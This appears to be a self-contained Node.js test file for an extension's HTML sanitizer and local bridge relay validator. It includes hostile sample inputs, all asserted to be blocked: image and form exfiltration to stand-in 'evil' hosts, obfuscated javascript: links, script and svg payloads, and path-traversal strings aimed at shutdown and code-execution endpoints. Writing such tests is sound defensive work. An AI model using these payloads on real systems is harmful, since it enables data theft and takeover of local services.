// Self-contained plain-node tests (no dependencies): node tests/security.test.js
// Uses a tiny stub HTML parser so the allowlist logic of Autono/side-panel/sanitize.js can run outside a browser.
// It checks our rules, not the browser's HTML parser: the browser still needs the manual checks in the report.
const fs = require('fs');
const os = require('os');
const path = require('path');
const assert = require('assert');

// ---- stub DOM -----------------------------------------------------------------------------------
const XHTML = 'http://www.w3.org/1999/xhtml';
const VOID = new Set(['br', 'hr', 'img', 'input', 'meta', 'link', 'base', 'embed']);
const RAW = new Set(['script', 'style', 'textarea', 'title']);
class Node_ {
  constructor(type) { this.nodeType = type; this.childNodes = []; this.parentNode = null; }
  get firstChild() { return this.childNodes[0] || null; }
  appendChild(n) { if (n.parentNode) n.parentNode.removeChild(n); n.parentNode = this; this.childNodes.push(n); return n; }
  insertBefore(n, ref) {
    if (n.parentNode) n.parentNode.removeChild(n);
    const i = ref ? this.childNodes.indexOf(ref) : this.childNodes.length;
    n.parentNode = this; this.childNodes.splice(i, 0, n); return n;
  }
  removeChild(n) { const i = this.childNodes.indexOf(n); assert(i >= 0); this.childNodes.splice(i, 1); n.parentNode = null; return n; }
  replaceChild(n, old) { this.insertBefore(n, old); this.removeChild(old); return old; }
  get textContent() { return this.nodeType === 3 ? this.data : this.childNodes.map((c) => (c.nodeType === 8 ? '' : c.textContent)).join(''); }
}
class Text_ extends Node_ { constructor(d) { super(3); this.data = d; } }
class Comment_ extends Node_ { constructor(d) { super(8); this.data = d; } }
const esc = (s) => s.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
const escA = (s) => s.replace(/&/g, '&amp;').replace(/"/g, '&quot;');
class El_ extends Node_ {
  constructor(tag, ns) { super(1); this.localName = tag; this.nodeName = tag.toUpperCase(); this.namespaceURI = ns; this.attributes = []; }
  getAttribute(n) { const a = this.attributes.find((x) => x.name === n); return a ? a.value : null; }
  hasAttribute(n) { return this.attributes.some((x) => x.name === n); }
  setAttribute(n, v) { const a = this.attributes.find((x) => x.name === n); if (a) a.value = String(v); else this.attributes.push({ name: n, value: String(v) }); }
  removeAttribute(n) { this.attributes = this.attributes.filter((x) => x.name !== n); }
  get innerHTML() {
    return this.childNodes.map((c) => {
      if (c.nodeType === 3) return esc(c.data);
      if (c.nodeType === 8) return `<!--${c.data}-->`;
      const at = c.attributes.map((a) => ` ${a.name}="${escA(a.value)}"`).join('');
      return VOID.has(c.localName) ? `<${c.localName}${at}>` : `<${c.localName}${at}>${c.innerHTML}</${c.localName}>`;
    }).join('');
  }
}
const decode = (s) => s.replace(/&lt;/g, '<').replace(/&gt;/g, '>').replace(/&quot;/g, '"').replace(/&amp;/g, '&');
function parse(html) {
  const body = new El_('body', XHTML);
  let cur = body; let i = 0; let ns = XHTML;
  const text = (t) => { if (t) cur.appendChild(new Text_(decode(t))); };
  const tagRe = /^<(\/?)([a-zA-Z][a-zA-Z0-9-]*)((?:\s+[^\s=>/]+(?:\s*=\s*(?:"[^"]*"|'[^']*'|[^\s>]+))?)*)\s*(\/?)>/;
  while (i < html.length) {
    const lt = html.indexOf('<', i);
    if (lt < 0) { text(html.slice(i)); break; }
    text(html.slice(i, lt));
    if (html.startsWith('<!--', lt)) {
      const e = html.indexOf('-->', lt); const end = e < 0 ? html.length : e;
      cur.appendChild(new Comment_(html.slice(lt + 4, end))); i = end + 3; continue;
    }
    const m = tagRe.exec(html.slice(lt));
    if (!m) { text('<'); i = lt + 1; continue; }
    i = lt + m[0].length;
    const tag = m[2].toLowerCase();
    if (m[1]) {
      let n = cur; while (n && n !== body && n.localName !== tag) n = n.parentNode;
      if (n && n !== body) cur = n.parentNode;
      if (tag === 'svg' || tag === 'math') ns = XHTML;
      continue;
    }
    if (tag === 'svg') ns = 'http://www.w3.org/2000/svg'; else if (tag === 'math') ns = 'http://www.w3.org/1998/Math/MathML';
    const el = new El_(tag, ns);
    const re = /([^\s=>/]+)(?:\s*=\s*(?:"([^"]*)"|'([^']*)'|([^\s>]+)))?/g; let a;
    while ((a = re.exec(m[3]))) {
      const nm = a[1].toLowerCase();
      if (!el.hasAttribute(nm)) el.setAttribute(nm, decode(a[2] ?? a[3] ?? a[4] ?? ''));
    }
    cur.appendChild(el);
    if (RAW.has(tag)) {
      const e = html.toLowerCase().indexOf(`</${tag}`, i); const end = e < 0 ? html.length : e;
      if (end > i) el.appendChild(new Text_(html.slice(i, end)));
      i = e < 0 ? html.length : html.indexOf('>', e) + 1; continue;
    }
    if (!VOID.has(tag) && !m[4]) cur = el;
    if ((tag === 'svg' || tag === 'math') && m[4]) ns = XHTML;
  }
  return { body, createElement: (t) => new El_(t, XHTML), createTextNode: (d) => new Text_(d) };
}
global.DOMParser = class { parseFromString(h) { return parse(h); } };

// ---- load the code under test --------------------------------------------------------------------
const root = path.join(__dirname, '..', 'Autono');
const tmp = path.join(os.tmpdir(), `autono-sanitize-${process.pid}.mjs`);
fs.copyFileSync(path.join(root, 'side-panel', 'sanitize.js'), tmp);

function loadRelayValidator() {
  const src = fs.readFileSync(path.join(root, 'background.js'), 'utf8');
  const a = src.indexOf('// --- bridge relay validator');
  const b = src.indexOf('// --- end bridge relay validator ---');
  assert(a >= 0 && b > a, 'validator markers not found');
  return new Function(`${src.slice(a, b)}; return { validateBridgeRelay };`)();
}

(async () => {
  const { sanitizeHtml, safeLinkUrl, safeImageUrl } = await import(require('url').pathToFileURL(tmp).href);
  let n = 0;
  const ok = (name, fn) => { fn(); n++; console.log('ok  ' + name); };
  const CTRL = String.fromCharCode(1);

  ok('remote image does not stay an <img>', () => {
    const out = sanitizeHtml('<p><img src="https://evil/?d=x" alt="a"></p>');
    assert(!/<img/i.test(out) && !out.includes('src='), out);
  });
  ok('remote image with empty alt (what marked emits for ![](url))', () => {
    const out = sanitizeHtml('<img src="https://evil/?d=secret" alt="">');
    assert(!/<img/i.test(out), out);
  });
  ok('<style> removed with contents', () => {
    const out = sanitizeHtml('<p>a</p><style>*{display:none}</style>');
    assert(!/style/i.test(out) && !out.includes('display'), out);
  });
  ok('<form action> / <input data-mirror> / button removed', () => {
    const out = sanitizeHtml('<form action="https://evil"><input data-mirror="settingGeminiApiKey" name=x><button>go</button>hello</form>');
    assert(!/form|input|button|data-mirror|action/i.test(out), out);
    assert(out.includes('hello'));
  });
  ok('uppercase javascript: href', () => {
    const out = sanitizeHtml('<A HREF=javascript:alert(1)>click</A>');
    assert(!/href|javascript/i.test(out) && out.includes('click'), out);
  });
  ok('obfuscated / non-http schemes refused', () => {
    assert.strictEqual(safeLinkUrl('java\tscript:alert(1)'), '');
    assert.strictEqual(safeLinkUrl(' ' + CTRL + 'javascript:alert(1)'), '');
    assert.strictEqual(safeLinkUrl('data:text/html,<script>'), '');
    assert.strictEqual(safeLinkUrl('//evil.example'), '');
    assert.strictEqual(safeLinkUrl('https://u:p@evil/'), '');
    assert.strictEqual(safeLinkUrl('file:///etc/passwd'), '');
  });
  ok('https link kept with target/rel, extras stripped', () => {
    const out = sanitizeHtml('<a href="https://example.com/x" onclick="x()" style="a:b" id="q">hi</a>');
    assert(out.includes('href="https://example.com/x"') && out.includes('target="_blank"') && out.includes('rel="noopener noreferrer"'), out);
    assert(!/onclick|style|id=/.test(out), out);
  });
  ok('mailto allowed', () => assert(safeLinkUrl('mailto:a@b.c').startsWith('mailto:')));
  ok('event handlers, ids, names, data-*, srcset, class stripped', () => {
    const out = sanitizeHtml('<div id="settingAgentConfirm" name="x" data-a="1" onmouseover="x()" style="position:fixed"><span class="hidden" srcset="a">t</span></div>');
    assert(!/id=|name=|data-|onmouseover|style|srcset|class/.test(out), out);
  });
  ok('svg / math / iframe / object / embed / meta / base / link / script dropped', () => {
    const out = sanitizeHtml('<svg onload=x()><circle></circle></svg><math><mi>x</mi></math><iframe src=//e></iframe><object data=x></object><embed src=x><meta http-equiv=refresh content="0;url=//e"><base href=//e><link rel=stylesheet href=//e><script>alert(1)</script>ok');
    assert.strictEqual(out, 'ok');
  });
  ok('image sources', () => {
    assert(safeImageUrl('data:image/png;base64,AAAA'));
    assert.strictEqual(safeImageUrl('data:image/svg+xml;base64,AAAA'), '');
    assert.strictEqual(safeImageUrl('https://evil/x.png'), '');
    assert(safeImageUrl('chrome-extension://abc/assets/a.png', 'chrome-extension://abc/'));
  });
  ok('code language class kept, others dropped', () => {
    const out = sanitizeHtml('<pre><code class="language-js">x</code></pre><code class="modal">y</code>');
    assert(out.includes('class="language-js"') && !out.includes('modal'), out);
  });
  ok('placeholder tokens never survive in attributes', () => {
    const out = sanitizeHtml('<a href="https://e.com/%%%MATH_INLINE_0%%%">x</a>');
    assert(!out.includes('%%%'), out);
  });
  ok('unknown wrapper tags unwrapped, dangerous content inside still removed', () => {
    const out = sanitizeHtml('<section><font color=red><b>bold</b><script>x</script></font></section>');
    assert.strictEqual(out, '<b>bold</b>');
  });

  const { validateBridgeRelay } = loadRelayValidator();
  const base = 'http://127.0.0.1:8765';
  ok('bridge_relay accepts the two exact routes', () => {
    assert.strictEqual(validateBridgeRelay(base, '/v1/stt/status', 'GET').url, base + '/v1/stt/status');
    assert.strictEqual(validateBridgeRelay(base, '/v1/stt/transcribe', 'POST').method, 'POST');
  });
  ok('bridge_relay rejects traversal and variants', () => {
    const bad = [
      '/v1/stt/../../api/power/shutdown', '/v1/stt/../../api/code/execute', '/v1/stt/%2e%2e/%2e%2e/api/power/shutdown',
      '/v1/stt/%2E%2E/api', '/v1/stt/..%2f..%2fapi', '/v1/stt/..\\..\\api', '/v1/stt/status?x=1', '/v1/stt/status#a',
      '/v1/stt//status', '//evil.example/v1/stt/status', 'http://evil/v1/stt/status', '/v1/stt/engine/install', '/v1/stt/', '',
      '/v1/stt/status/', '/V1/stt/status', '/v1/stt/status%00', '/v1/stt/model',
    ];
    for (const p of bad) assert.throws(() => validateBridgeRelay(base, p, 'GET'), `should reject ${p}`);
    assert.throws(() => validateBridgeRelay(base, '/v1/stt/status', 'POST'));
    assert.throws(() => validateBridgeRelay(base, '/v1/stt/transcribe', 'DELETE'));
    assert.throws(() => validateBridgeRelay(base, null, 'GET'));
  });

  fs.unlinkSync(tmp);
  console.log(`\n${n} tests passed`);
})().catch((e) => { try { fs.unlinkSync(tmp); } catch (_) { /* ignore */ } console.error(e); process.exit(1); });
